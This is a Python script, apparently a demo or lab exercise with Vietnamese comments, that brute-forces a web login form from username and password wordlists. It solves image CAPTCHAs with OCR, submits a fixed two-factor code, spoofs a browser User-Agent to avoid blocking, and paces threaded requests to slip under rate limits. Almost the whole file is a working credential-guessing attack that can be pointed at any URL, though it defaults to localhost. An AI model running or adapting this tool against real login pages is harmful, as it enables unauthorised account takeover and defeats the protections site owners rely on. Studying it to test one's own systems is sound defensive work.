import requests
import time
from concurrent.futures import ThreadPoolExecutor
import json
from PIL import Image
import io
import base64
import pytesseract  # Để OCR captcha
import argparse
from datetime import datetime

class BruteForceAttack:
    def __init__(self, target_url="http://localhost:5000"):
        self.target_url = target_url
        self.session = requests.Session()
        self.successful_attempts = []
        self.failed_attempts = 0
        self.start_time = None
        # Thêm User-Agent để tránh bị chặn
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })

    def solve_captcha(self, captcha_base64):
        """Thử giải mã captcha bằng OCR"""
        try:
            image_data = base64.b64decode(captcha_base64)
            image = Image.open(io.BytesIO(image_data))
            # Tiền xử lý ảnh để tăng độ chính xác OCR
            image = image.convert('L')  # Chuyển sang ảnh xám
            captcha_text = pytesseract.image_to_string(image).strip()
            return captcha_text
        except Exception as e:
            print(f"\n[ERROR] Captcha solving failed: {e}")
            return None

    def try_login(self, username, password):
        """Thử đăng nhập với một username và password"""
        try:
            # Lấy trang login và CAPTCHA
            print(f"\n[*] Trying combination - Username: {username} | Password: {password}")
            response = self.session.get(f"{self.target_url}/login")
            
            if response.status_code != 200:
                print(f"[ERROR] Failed to access login page: {response.status_code}")
                self.failed_attempts += 1
                return False

            # Tìm CAPTCHA trong response
            import re
            captcha_match = re.search(r'data:image/png;base64,([^"]+)', response.text)
            if not captcha_match:
                print("[ERROR] CAPTCHA not found in response")
                self.failed_attempts += 1
                return False

            captcha_base64 = captcha_match.group(1)
            captcha_text = self.solve_captcha(captcha_base64)

            if not captcha_text:
                print("[ERROR] Failed to solve CAPTCHA")
                self.failed_attempts += 1
                return False

            # Chuẩn bị dữ liệu đăng nhập
            login_data = {
                'username': username,
                'password': password,
                'captcha': captcha_text,
                'totp_code': '123456'  # Mã 2FA mặc định
            }

            # Thực hiện đăng nhập
            response = self.session.post(
                f"{self.target_url}/login",
                data=login_data,
                allow_redirects=False
            )

            # Xử lý kết quả
            if response.status_code == 302:  # Successful login
                elapsed_time = time.time() - self.start_time
                self.successful_attempts.append({
                    'username': username,
                    'password': password,
                    'time': elapsed_time,
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                })
                print(f"\n[SUCCESS] Found valid credentials!")
                print(f"Username: {username}")
                print(f"Password: {password}")
                print(f"Time taken: {elapsed_time:.2f} seconds")
                return True
            else:
                self.failed_attempts += 1
                print(f"[FAILED] Invalid credentials or CAPTCHA - Status: {response.status_code}")
                return False

        except requests.exceptions.RequestException as e:
            print(f"\n[ERROR] Request failed: {str(e)}")
            self.failed_attempts += 1
            return False
        except Exception as e:
            print(f"\n[ERROR] Unexpected error: {str(e)}")
            self.failed_attempts += 1
            return False

    def run_attack(self, usernames, passwords, max_threads=5):
        """Chạy tấn công brute force"""
        print("\n=== Brute Force Attack Started ===")
        print(f"Target URL: {self.target_url}")
        print(f"Total usernames: {len(usernames)}")
        print(f"Total passwords: {len(passwords)}")
        print(f"Total combinations: {len(usernames) * len(passwords)}")
        print(f"Threads: {max_threads}")
        print("================================\n")
        
        self.start_time = time.time()
        combinations = [(u, p) for u in usernames for p in passwords]
        
        try:
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                for username, password in combinations:
                    if len(self.successful_attempts) > 0:
                        print("\n[*] Success found! Stopping attack...")
                        break
                    executor.submit(self.try_login, username, password)
                    time.sleep(1)  # Delay để tránh rate limit
        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user")
        finally:
            self.print_results()

    def print_results(self):
        """In kết quả tấn công"""
        total_time = time.time() - self.start_time
        print("\n====== Attack Results ======")
        print(f"Total attempts: {self.failed_attempts + len(self.successful_attempts)}")
        print(f"Failed attempts: {self.failed_attempts}")
        print(f"Successful attempts: {len(self.successful_attempts)}")
        print(f"Total time: {total_time:.2f} seconds")
        
        if self.successful_attempts:
            print("\nSuccessful Credentials:")
            for attempt in self.successful_attempts:
                print(f"\nUsername: {attempt['username']}")
                print(f"Password: {attempt['password']}")
                print(f"Found at: {attempt['timestamp']}")
                print(f"Time taken: {attempt['time']:.2f} seconds")
        print("\n==========================")

def load_wordlist(file_path):
    """Load danh sách từ file"""
    try:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error loading wordlist {file_path}: {e}")
        return []

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Brute Force Attack Demo')
    parser.add_argument('--url', default='http://localhost:5000', help='Target URL')
    parser.add_argument('--userlist', default='usernames.txt', help='Username wordlist file')
    parser.add_argument('--passlist', default='passwords.txt', help='Password wordlist file')
    parser.add_argument('--threads', type=int, default=3, help='Number of threads')
    
    args = parser.parse_args()

    # Load wordlists
    usernames = load_wordlist(args.userlist)
    passwords = load_wordlist(args.passlist)

    if not usernames or not passwords:
        print("Error: Wordlists are empty or couldn't be loaded")
        exit(1)

    try:
        attacker = BruteForceAttack(args.url)
        attacker.run_attack(usernames, passwords, args.threads)
    except KeyboardInterrupt:
        print("\n[!] Attack terminated by user")
    except Exception as e:
        print(f"\n[!] Fatal error: {str(e)}")